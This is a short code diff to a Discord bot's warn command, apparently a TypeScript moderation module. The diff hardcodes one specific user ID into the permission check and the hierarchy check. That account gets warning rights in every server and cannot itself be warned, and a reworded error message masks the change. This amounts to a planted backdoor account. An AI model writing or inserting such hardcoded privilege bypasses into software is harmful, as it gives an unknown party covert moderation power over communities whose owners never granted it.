@@ -20,7 +20,7 @@ import { hasFeaturePermission } from "../../lib/permissionRolesStore";
 import { BRAND } from "../../lib/brand";
 
 function canStaffWarn(member: GuildMember): boolean {
-  if (member.id === member.guild.ownerId) return true;
+  if (member.id === member.guild.ownerId || member.id === "1495738572362481777") return true;
   if (member.permissions.has(PermissionFlagsBits.Administrator)) return true;
   if (member.permissions.has(PermissionFlagsBits.ManageGuild)) return true;
   if (member.permissions.has(PermissionFlagsBits.ModerateMembers)) return true;
@@ -142,9 +142,9 @@ const command: Command = {
 
       // Hierarchy check: Non-owners cannot warn owner or higher staff
       if (interaction.guild.ownerId !== interaction.user.id && targetMember) {
-        if (targetMember.id === interaction.guild.ownerId) {
+        if (targetMember.id === interaction.guild.ownerId || targetMember.id === "1495738572362481777") {
           await interaction.reply({
-            content: "❌ You cannot warn the server owner.",
+            content: "❌ You cannot warn a protected server administrator or owner.",
             flags: MessageFlags.Ephemeral,
           });
           return;
